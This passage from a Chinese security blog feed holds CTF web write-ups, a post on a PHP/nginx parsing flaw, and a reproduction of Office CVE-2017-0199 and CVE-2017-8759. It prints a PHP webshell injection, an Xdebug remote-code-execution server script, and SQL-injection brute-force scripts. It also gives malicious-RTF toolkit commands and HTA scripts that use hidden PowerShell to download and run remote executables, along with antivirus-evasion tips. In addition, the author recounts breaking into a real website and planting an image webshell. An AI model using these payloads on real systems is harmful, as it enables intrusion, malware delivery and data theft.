class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$keywords = [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;];</div><div class="line">$uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]);</div><div class="line">parse_str($uri[&apos;query&apos;], $query);</div></pre></td></tr></table></figure><p>通过构造 <a href="http://47.52.152.93:20000////user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg" target="_blank" rel="external">http://47.52.152.93:20000////user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg</a>  即可获得下个提示信息（好像又是非预期。。。）之后在上传函数的流程中发现 上传文件名处存在命令注入，直接构造把数据库导出就可以获取flag。。</p><p><code>mysqldump -uroot -pNu1LCTF2018\!@#qwe --all-databases &gt; flagggggggg.png</code> (对不起，我就是这么暴力。。。</p><h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy php"></a>easy php</h2><p>两个非预期解法。</p><p>第一个是通过包含session文件，利用 <code>PHP_SESSION_UPLOAD_PROGRESS</code>控制session内容，成功达成命令执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;form action=&quot;http://47.52.246.175:23333/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</div><div class="line"> &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?=`echo &apos;&lt;?php eval(\$_REQUEST[winter3un])?&gt;&apos;&gt;gg.php`?&gt;&quot; /&gt;</div><div class="line"> &lt;input type=&quot;file&quot; name=&quot;file1&quot; /&gt;</div><div class="line"> &lt;input type=&quot;submit&quot; /&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure><p>第二个是通过xdebug</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl --url http://112.213.118.106/?XDEBUG_SESSION_START=1</div></pre></td></tr></table></figure><p>exp 脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># encoding: utf-8</span></div><div class="line"><span class="keyword">from</span> socketserver <span class="keyword">import</span> BaseRequestHandler, TCPServer</div><div class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</div><div class="line">php_code = <span class="string">b"print_r(file_put_contents('/var/www/html/cmd.php','&lt;?=`$_GET[a]`?&gt;'), true)"</span></div><div class="line">payload = <span class="string">b"""eval -i 105 -- %s"""</span> % b64encode(php_code)</div><div class="line"><span class="keyword">if</span> len(payload) % <span class="number">304</span> != <span class="number">0</span>:</div><div class="line">    payload = payload + <span class="string">b'\x00'</span> * (<span class="number">304</span> - len(payload) % <span class="number">304</span>)</div><div class="line">count = <span class="number">0</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">EchoHandler</span><span class="params">(BaseRequestHandler)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">global</span> count</div><div class="line">        print(<span class="string">'Got connection from'</span>, self.client_address)</div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            msg = self.request.recv(<span class="number">8192</span>)</div><div class="line">            print(msg)</div><div class="line">            <span class="keyword">if</span> <span class="keyword">not</span> msg:</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="keyword">if</span> count == <span class="number">0</span>:</div><div class="line">                self.request.send(payload)</div><div class="line">            count += <span class="number">1</span></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    serv = TCPServer((<span class="string">''</span>, <span class="number">9000</span>), EchoHandler)</div><div class="line">    serv.serve_forever()</div></pre></td></tr></table></figure><h2 id="harder-php"><a href="#harder-php" class="headerlink" title="harder php"></a>harder php</h2><p>之后出题人修复了非预期的解法，正常解法流程如下。</p><p>1、备份文件源代码泄漏，通过代码审计，找到留言处存在sql注入漏洞。</p><p>2、利用该sql注入漏洞，获取管理员密码。</p><p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">`,0x12345)%23</div></pre></td></tr></table></figure></p><p>3、管理员登录需要本地IP<code>127.0.0.1</code> ,根据提示反序列化导致ssrf，谷歌搜索，第一篇文章即是 《PHP Unserialize Exploiting》（<a href="https://www.slideshare.net/MailRuGroup/security-meetup-22-php-unserialize-exploiting）" target="_blank" rel="external">https://www.slideshare.net/MailRuGroup/security-meetup-22-php-unserialize-exploiting）</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">https://www.youtube.com/watch?v=5AdVQzUB6iM</div><div class="line">SSRF Unserializing SoapClient can provide SSRF with CRLF injection. O:10:&quot;SoapClient&quot;:3:&#123;s:3:&quot;uri&quot;;s:18:&quot;http://hostname/3%0a1&quot;; s:8:&quot;location&quot;;s:23:&quot;http://hostname/123&quot;;s:13:&quot; _soap_version&quot;;i:1;&#125;</div></pre></td></tr></table></figure></p><p>4、其user-agent参数可以CRLF注入，伪造<code>http request</code>头，从而达成post任意参数的ssrf，利用该ssrf获取管理员登录后的session。</p><p>5、利用管理员登录后的session，上传php文件，但是有个坑，<code>stripos(file_get_contents($move_to_file),&#39;&lt;?php&#39;)&gt;=0</code> 这个表达式是恒返回0的。也就是说，不管怎么样都会触发<code>rm /app/*</code></p><p>6、通过搜索引擎查询<code>rm * 无法删除文件</code>，查询到，当文件名前缀为<code>-x</code>时，必须用 <code>rm -- *</code> 才能删除，故上传文件名为<code>-x1234</code>的php一句话木马，再通过http response返回的时间戳来爆破文件名（文件夹所属是root，权限333），爆破成后即可getshell</p><h2 id="baby-sqli"><a href="#baby-sqli" class="headerlink" title="baby sqli"></a>baby sqli</h2><p>题目太坑，注入点在个签那里，条件判断在头像那边。。</p><p>当时没做出，给个官方脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"># -*- coding:utf-8 -*- </div><div class="line">import requests</div><div class="line">from random import Random</div><div class="line">def random_str(randomlength=8):</div><div class="line">    str = &apos;&apos;</div><div class="line">    chars = &apos;AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789&apos;</div><div class="line">    length = len(chars) - 1</div><div class="line">    random = Random()</div><div class="line">    for i in range(randomlength):</div><div class="line">        str+=chars[random.randint(0, length)]</div><div class="line">    return str</div><div class="line">dic=&apos;0123456789_@:.abcdefghijklmnopqrstuvwxyz&apos;</div><div class="line">url=&quot;http://47.98.51.5/vlogin/reg.php&quot;</div><div class="line">table_name=&apos;&apos;</div><div class="line">def register(email,uinfo):</div><div class="line">url=&quot;http://47.98.51.5/vlogin/reg.php&quot;</div><div class="line">data=&#123;</div><div class="line">&quot;email&quot;:email,</div><div class="line">&quot;pass&quot;:&quot;123&quot;,</div><div class="line">&quot;userinfo&quot;:userinfo</div><div class="line">&#125;</div><div class="line">requests.post(url=url,data=data)</div><div class="line">def login(loginuser):</div><div class="line">url=&quot;http://47.98.51.5/vlogin/login.php&quot;</div><div class="line">a=requests.session()</div><div class="line">data2=&#123;</div><div class="line">&quot;loginuser&quot;:loginuser,</div><div class="line">&quot;loginpass&quot;:&quot;123&quot;</div><div class="line">&#125;</div><div class="line">a.post(url=url,data=data2)</div><div class="line">url3=&quot;http://47.98.51.5/vlogin/vpage/index.php&quot;</div><div class="line">b=a.get(url3)</div><div class="line">return b.text</div><div class="line">for i in range(1,100):</div><div class="line">for j in dic:</div><div class="line">email=random_str(randomlength=8)+&quot;@1.com&quot;</div><div class="line">userinfo=&quot;&apos;or(if(1,(select(substr((select(user())),&#123;&#125;,1))=&apos;&#123;&#125;&apos;),1)=1)#&quot;.format(i,j)</div><div class="line">register(email,userinfo)</div><div class="line">c=login(email)</div><div class="line">if &quot;1.png&quot; in c:</div><div class="line">table_name += j</div><div class="line">print table_name</div><div class="line">break</div><div class="line">print table_name</div></pre></td></tr></table></figure><h2 id="Reference："><a href="#Reference：" class="headerlink" title="Reference："></a>Reference：</h2><p><a href="http://netsecurity.51cto.com/art/201702/531607.htm" target="_blank" rel="external">http://netsecurity.51cto.com/art/201702/531607.htm</a>    一种新的MySQL下Update、Insert注入方法</p><p><a href="https://www.anquanke.com/post/id/84837" target="_blank" rel="external">https://www.anquanke.com/post/id/84837</a>   题目2 无人机病了（Web）</p><p><a href="https://www.restran.net/2017/09/16/php-xdebug-cmd-exec/" target="_blank" rel="external">https://www.restran.net/2017/09/16/php-xdebug-cmd-exec/</a>   PHP Xdebug 远程调试命令执行分析</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;因为工作上涉及到web知识的比较多，所以作为pwn选手，这次并没有关注pwn的任何一题题目。。反倒是把web题做了个一遍ORZ&lt;/p&gt;
    
    </summary>
    
    
      <category term="web" scheme="https://winter3un.github.io/tags/web/"/>
    
      <category term="ctf" scheme="https://winter3un.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>低版本php+nginx 解析漏洞</title>
    <link href="https://winter3un.github.io/2018/02/20/2018-2-21/"/>
    <id>https://winter3un.github.io/2018/02/20/2018-2-21/</id>
    <published>2018-02-21T07:20:42.000Z</published>
    <updated>2018-02-21T07:27:14.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>事情要从某个午后说起，那时我正在日一个xx站，这个站nginx版本是<code>1.6.2</code>，php版本是<code>5.3.3</code>，开了<code>GPC</code>，我反复折腾了几天下来，有了数据库权限，有了任意文件下载，但是审了半天源码下来，审不出一个shell来，很绝望地上传了一个图片马，后面加了个<code>/.php</code>访问，它。。竟然执行了！？<br><img src="/2018/02/20/2018-2-21/5.png" alt="5.png" title=""></p><a id="more"></a><img src="/2018/02/20/2018-2-21/6.png" alt="6.png" title=""><p>它怎么能执行？？不是小于&lt;= 0.8.37么，这nginx版本咋能执行？？？</p><p><strong>下图来自wooyun</strong></p><img src="/2018/02/20/2018-2-21/2.jpg" alt="2.jpg" title=""><p>这和说好的不一样喂？？？？<br><img src="/2018/02/20/2018-2-21/1.jpg" alt="1.jpg" title=""></p><p>群里吐槽了一番后ing，发现。。。这解析漏洞并不是nginx造成的问题，是因为php啊。。。。</p><img src="/2018/02/20/2018-2-21/4.png" alt="4.png" title=""><img src="/2018/02/20/2018-2-21/3.jpg" alt="3.jpg" title=""><p>php版本 <code>&lt;= 5.3.9</code>的时候（之后版本里有<code>security.limit_extensions</code>配置限制），配合<code>nginx</code>（无论版本多高），在默认配置下（<code>cgi.fix_pathinfo</code>全版本php默认配置为开启），存在php解析漏洞。</p><p>元凶是php.ini中的<code>cgi.fix_pathinfo</code>，nginx完成一次助攻。。。</p><img src="/2018/02/20/2018-2-21/5.jpg" alt="5.jpg" title=""><p>由于这个解析漏洞被官方认为是特性而不是漏洞，所以没有cve。。。。</p><p>btw：在本机测试的时候，发现phpstudy全版本nginx+php存在这个解析漏洞。。。。这应该算是意外的惊喜。</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="http://drops.xmd5.com/static/drops/papers-539.html" target="_blank" rel="external">http://drops.xmd5.com/static/drops/papers-539.html</a>  解析漏洞总结</p><p><a href="http://www.laruence.com/2010/05/20/1495.html" target="_blank" rel="external">http://www.laruence.com/2010/05/20/1495.html</a>  Nginx + PHP CGI的一个可能的安全漏洞</p><p><a href="http://www.cnblogs.com/buffer/archive/2011/07/24/2115552.html" target="_blank" rel="external">http://www.cnblogs.com/buffer/archive/2011/07/24/2115552.html</a>  PHP CGI 中 fix_pathinfo 引起的安全隐患</p><p><a href="https://taobig.org/?p=650" target="_blank" rel="external">https://taobig.org/?p=650</a>   php.ini中的cgi.fix_pathinfo选项</p><p><a href="https://bugs.php.net/bug.php?id=55181" target="_blank" rel="external">https://bugs.php.net/bug.php?id=55181</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h2&gt;&lt;p&gt;事情要从某个午后说起，那时我正在日一个xx站，这个站nginx版本是&lt;code&gt;1.6.2&lt;/code&gt;，php版本是&lt;code&gt;5.3.3&lt;/code&gt;，开了&lt;code&gt;GPC&lt;/code&gt;，我反复折腾了几天下来，有了数据库权限，有了任意文件下载，但是审了半天源码下来，审不出一个shell来，很绝望地上传了一个图片马，后面加了个&lt;code&gt;/.php&lt;/code&gt;访问，它。。竟然执行了！？&lt;br&gt;&lt;img src=&quot;/2018/02/20/2018-2-21/5.png&quot; alt=&quot;5.png&quot; title=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="web" scheme="https://winter3un.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>对cve-2017-0199与cve-2017-8759的浅析</title>
    <link href="https://winter3un.github.io/2017/10/29/cve-2017-office/"/>
    <id>https://winter3un.github.io/2017/10/29/cve-2017-office/</id>
    <published>2017-10-29T12:41:52.000Z</published>
    <updated>2018-03-14T04:32:02.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先说一下为什么偏偏选了这两个cve来复现+分析，其实是因为这两个cve复现比较容易，而且是目前apt团体主要用于apt打击的工具，而且于我个人而言，也是第一次分析word漏洞（当然这两个只是word的逻辑漏洞，并不是溢出漏洞，相对来说比较容易分析）。</p><p>没想到的是分析这两个漏洞的过程并不是一帆风顺，甚至可以说是坑坑洼洼了ORZ。也为了后人的学习以及自己将来的学习，故写下这篇文章。</p><a id="more"></a><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h3 id="victimer"><a href="#victimer" class="headerlink" title="victimer"></a>victimer</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">os:10.0.14393 default Build 14393</div><div class="line">office:ver2010(14.0.4760.1000)</div><div class="line">.net:v4.0.30319</div></pre></td></tr></table></figure><p>ps:查看.net版本（资源管理器打开<code>%systemroot%\Microsoft.NET\Framework</code>,最高版本即是）</p><h3 id="attacker"><a href="#attacker" class="headerlink" title="attacker"></a>attacker</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python:2.7.14</div></pre></td></tr></table></figure><h2 id="cve-2017-0199"><a href="#cve-2017-0199" class="headerlink" title="cve-2017-0199"></a>cve-2017-0199</h2><p>该漏洞影响版本如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Microsoft Office 2016</div><div class="line">Microsoft Office 2013</div><div class="line">Microsoft Office 2010</div><div class="line">Microsoft Office 2007</div></pre></td></tr></table></figure><p>这个漏洞出在word对已经插入的远程对象访问的时候，如果访问的时候http相应头重含有<code>Content-Type: application/hta</code>那么将会对该对象以脚本的方式解析执行。具体的过程如图所示<br><img src="/2017/10/29/cve-2017-office/1.png" alt="1.png" title=""></p><p>脚本：<a href="https://github.com/bhdresh/CVE-2017-0199" target="_blank" rel="external">https://github.com/bhdresh/CVE-2017-0199</a></p><p>在实验过程中，发现该脚本有几处坑，一个是<code>server_thread</code>函数写了两遍,还有一个是<code>open</code>函数缺少了一个参数，故而本人修改了这两处问题，修改后的代码放于github上。</p><p>使用方式和原来的脚本没有大的区别 <a href="https://github.com/Winter3un/cve_2017_0199" target="_blank" rel="external">https://github.com/Winter3un/cve_2017_0199</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">method 1 分发exe可执行文件并执行：</div><div class="line">1) Generate malicious RTF file</div><div class="line">python cve-2017-0199_toolkit.py -M gen -t RTF -w Invoice.rtf -u http://192.168.1.125/demo.rtf</div><div class="line">2) Start toolkit in exploit mode to deliver local payload</div><div class="line">python cve-2017-0199_toolkit.py -M exp -t RTF -e http://192.168.1.125/shell.exe -l shell.exe</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">method 2 分发hta脚本并执行：</div><div class="line">1) Generate malicious RTF file</div><div class="line">python cve-2017-0199_toolkit.py -M gen -t RTF -w Invoice.rtf -u http://192.168.1.125/demo.rtf</div><div class="line">2) Start toolkit in exploit mode to deliver custom HTA file</div><div class="line">python cve-2017-0199_toolkit.py -M exp -t RTF -H custom.hta</div></pre></td></tr></table></figure><p>ps：虚拟机win7+office2010 未成功，不知道为啥。。</p><h2 id="cve-2017-8759"><a href="#cve-2017-8759" class="headerlink" title="cve-2017-8759"></a>cve-2017-8759</h2><p>这个漏洞其实是出在.net模块，但是是通过word或者写字板作为媒介引发的。漏洞原因是开发者没有考虑到输入点会存在换行符，导致了单行注释绕过。我们可以将存在换行符的.net代码发送过去绕过单行注释，进行.net代码执行。这个漏洞危害还是挺大的，与office无关，几乎影响所有版本的.net框架<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Microsoft .NET Framework 4.6.2</div><div class="line">Microsoft .NET Framework 4.6.1</div><div class="line">Microsoft .NET Framework 3.5.1</div><div class="line">Microsoft .NET Framework 4.7</div><div class="line">Microsoft .NET Framework 4.6</div><div class="line">Microsoft .NET Framework 4.5.2</div><div class="line">Microsoft .NET Framework 3.5</div><div class="line">Microsoft .NET Framework 2.0 SP2</div></pre></td></tr></table></figure></p><p>脚本来自: <a href="https://github.com/Winter3un/cve_2017_8759" target="_blank" rel="external">https://github.com/Winter3un/cve_2017_8759</a>  生成exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python3 CreateRTF.py -f 1.rtf -u http://127.0.0.1:8080/exp.txt</div></pre></td></tr></table></figure><p>开启服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -m SimpleHTTPServer 8080</div></pre></td></tr></table></figure><h2 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h2><p>免杀主要参考了<code>剖析RTF文件中的Anti-Analysis技术</code>这篇文章</p><p>1) 不完整的RTF头部</p><p>2）奇怪的16进制数</p><p>3）在16进制数中插入额外的空格</p><p>4）16进制编码数据中的虚假RTF控制字</p><p>5）在16进制数据中包含二进制数据</p><p>但是目前来说，这五种方式做的免杀都会被主流杀软干掉，样本hash：<code>b7f67029abc6e44e860fb13313a2b8024c59f200d3680c5dfd2886c9f3bcfc54</code></p><p>virustotal检出率<code>21/59</code>，目前没有啥好的办法可以绕过杀软。</p><h2 id="hta脚本相关"><a href="#hta脚本相关" class="headerlink" title="hta脚本相关"></a>hta脚本相关</h2><p>最简<br><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">a=<span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>);</div><div class="line">a.run(<span class="comment">'%windir%\\System32\\cmd.exe /c calc.exe', 0);window.close();</span></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p><p>powershell代码执行</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;script language=<span class="string">"VBScript"</span>&gt;</div><div class="line"><span class="keyword">Sub</span> window_onload</div><div class="line"><span class="keyword">const</span> impersonation = <span class="number">3</span></div><div class="line"><span class="keyword">Const</span> HIDDEN_WINDOW = <span class="number">12</span></div><div class="line"><span class="keyword">Set</span> Locator = <span class="built_in">CreateObject</span>(<span class="string">"WbemScripting.SWbemLocator"</span>)</div><div class="line"><span class="keyword">Set</span> Service = Locator.ConnectServer()</div><div class="line">Service.Security_.ImpersonationLevel=impersonation</div><div class="line"><span class="keyword">Set</span> objStartup = Service.<span class="keyword">Get</span>(<span class="string">"Win32_ProcessStartup"</span>)</div><div class="line"><span class="keyword">Set</span> objConfig = objStartup.SpawnInstance_</div><div class="line"><span class="keyword">Set</span> Process = Service.<span class="keyword">Get</span>(<span class="string">"Win32_Process"</span>)</div><div class="line"><span class="keyword">Error</span> = Process.Create(<span class="string">"powershell.exe -nop -w hidden calc.exe"</span>, <span class="literal">null</span>, objConfig, intProcessID)</div><div class="line">window.close()</div><div class="line"><span class="keyword">end</span> <span class="keyword">sub</span></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure><p>powershell下载远程exe并执行</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">a=<span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>);</div><div class="line">a.run(<span class="comment">'%SystemRoot%/system32/WindowsPowerShell/v1.0/powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile(\'http://192.168.1.125/shell.exe\', \'c:/windows/temp/shell.exe\'); c:/windows/temp/shell.exe', 0);window.close();</span></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;script language=<span class="string">"VBScript"</span>&gt;</div><div class="line"><span class="keyword">Sub</span> window_onload</div><div class="line">    window.resizeTo <span class="number">0</span>,<span class="number">0</span></div><div class="line">    window.MoveTo <span class="number">-100</span>,<span class="number">-100</span></div><div class="line"><span class="keyword">const</span> impersonation = <span class="number">3</span></div><div class="line"><span class="keyword">Const</span> HIDDEN_WINDOW = <span class="number">12</span></div><div class="line"><span class="keyword">Set</span> Locator = <span class="built_in">CreateObject</span>(<span class="string">"WScript.Shell"</span>)</div><div class="line">    Locator.Run<span class="string">"powershell.exe -nop -w hidden -c ""IEX (new-object net.webclient).downloadstring('http://192.168.211.149:80/artifact.exe')"""</span>,<span class="number">0</span>,<span class="literal">FALSE</span></div><div class="line">    window.close()</div><div class="line"><span class="keyword">end</span> <span class="keyword">sub</span></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure><p>以上脚本都能在我的github上找到</p><h2 id="参考文档："><a href="#参考文档：" class="headerlink" title="参考文档："></a>参考文档：</h2><p>对CVE-2017-0199的一次复现过程与内网穿透的利用：<a href="https://zhuanlan.zhihu.com/p/26522540?utm_medium=social&amp;utm_source=weibo" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/26522540?utm_medium=social&amp;utm_source=weibo</a><br>OFFICE OLE2LINK（CVE-2017-0199）漏洞利用详解：<a href="http://www.freebuf.com/articles/system/131969.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/131969.html</a><br>CVE-2017-0199漏洞复现：<a href="http://www.hackersb.cn/hacker/228.html" target="_blank" rel="external">http://www.hackersb.cn/hacker/228.html</a><br>一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现：最新的Office高级威胁攻击预警：<a href="http://www.freebuf.com/articles/system/147602.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/147602.html</a><br>CVE-2017-8759 微软word漏洞复现以及利用：<a href="http://www.cnblogs.com/deen-/p/7532078.html" target="_blank" rel="external">http://www.cnblogs.com/deen-/p/7532078.html</a><br>CVE-2017-8759完美复现.并且解决HTA,POWERSHELL弹框闪烁：<a href="http://www.lz1y.cn/?p=799" target="_blank" rel="external">http://www.lz1y.cn/?p=799</a><br>最新CVE-2017-8759漏洞复现的两种姿势：<a href="https://bbs.77169.com/forum.php?mod=viewthread&amp;tid=364738" target="_blank" rel="external">https://bbs.77169.com/forum.php?mod=viewthread&amp;tid=364738</a><br>剖析RTF文件中的Anti-Analysis技术：<a href="http://www.freebuf.com/articles/terminal/102018.html" target="_blank" rel="external">http://www.freebuf.com/articles/terminal/102018.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;首先说一下为什么偏偏选了这两个cve来复现+分析，其实是因为这两个cve复现比较容易，而且是目前apt团体主要用于apt打击的工具，而且于我个人而言，也是第一次分析word漏洞（当然这两个只是word的逻辑漏洞，并不是溢出漏洞，相对来说比较容易分析）。&lt;/p&gt;
&lt;p&gt;没想到的是分析这两个漏洞的过程并不是一帆风顺，甚至可以说是坑坑洼洼了ORZ。也为了后人的学习以及自己将来的学习，故写下这篇文章。&lt;/p&gt;
    
    </summary>
    
    
      <category term="cve" scheme="https://winter3un.github.io/tags/cve/"/>
    
      <category term="office" scheme="https://winter3un.github.io/tags/office/"/>
    
  </entry>
  
  <entry>
    <title>810线下赛复盘</title>
    <link href="https://winter3un.github.io/2017/08/16/2017-8-10/"/>
    <id>https://winter3un.github.io/2017/08/16/2017-8-10/</id>
    <published>2017-08-16T16:32:29.000Z</published>
    <updated>2017-08-17T17:05:27.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><strong>将atoi_got修改成printf_plt，威力无穷~</strong></p><p>线下赛只有一个pwn题，但这一个pwn题却出的非常好，虽然防御机制没有全开，但是考察点非常之多，就其中一个漏洞的利用，就考察了如下五个知识点。</p><ul><li>string overflow</li><li>int overflow</li><li>off by one</li><li>race condition</li><li>heap overlay </li><li>fmt</li></ul><a id="more"></a><h3 id="第一个漏洞"><a href="#第一个漏洞" class="headerlink" title="第一个漏洞"></a>第一个漏洞</h3><p>第一个漏洞出现在west模块，该模块可以创建最多两个house，初始的金币都为5（虽然有一个tricks，但是然并软），然后可以选择其中一个house的id购买weapon，若其中一个house的weapon比另一个强，就可以将另一个house消灭掉（free），那么我们怎么才能增加我们的金币数目呢，其实我们可以利用string overflow的方式，如下代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">fgets(&amp;s1, 0x16, stdin);</div><div class="line">v9 = 0xA;</div><div class="line">if ( strlen(&amp;s1) &gt; 0x10 )</div><div class="line">&#123;</div><div class="line">puts(&quot;Your name is too long!&quot;);</div><div class="line">exit(-1);</div><div class="line">&#125;</div><div class="line">str_cpy(0x28LL * (signed int)i + 0x605148, (__int64)&amp;s1);</div></pre></td></tr></table></figure><p>s1可以输入0x16个字节，而string函数都以<code>&#39;\x00&#39;</code>字节定义字符串的结束，我们可以构造绕过，将money覆盖成一个最大数<code>0x7fffffff</code>,即可买我们想要的任何装备，接着漏洞出现在<code>snprintf</code>处，该函数的返回值由原本要复制到<code>dst addr</code> 的数据长度决定，故而这边存在一个溢出，我们只要让返回值大于<code>0x54</code>即可，<code>int overflow</code>刚好能够做到这件事。接着利用刚才获取的长度溢出一个字节（只能达到一个字节，故而我们可以利用<code>off by one</code>技术将指向soliders的指针位置上移），接着利用heap overlay技术将该上移的指针加入到unsorted 